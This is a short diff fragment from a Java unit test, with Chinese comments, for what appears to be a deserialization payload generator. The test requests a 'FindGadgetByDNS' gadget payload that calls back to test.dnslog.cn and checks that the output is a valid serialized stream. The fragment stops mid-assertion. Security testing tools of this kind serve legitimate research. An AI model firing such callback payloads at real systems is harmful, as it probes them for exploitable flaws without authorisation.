@@ -98,7 +98,7 @@ public class FindGadgetByDNSTest {
 
     @Test
     public void endToEndThroughPayloadDispatch() throws Exception {
-        // 走工具真实分发入口 choiceTypeByswitch -> getPayload，验证可生成合法序列化流
+        // 走工具真实分发入口 ChainDispatcher -> getPayload，验证可生成合法序列化流
         String b64 = payload.getPayload("FindGadgetByDNS", "test.dnslog.cn");
         byte[] ser = Base64.decode(b64);
         assertTrue("输出应为 Java 序列化流", ser.length > 4
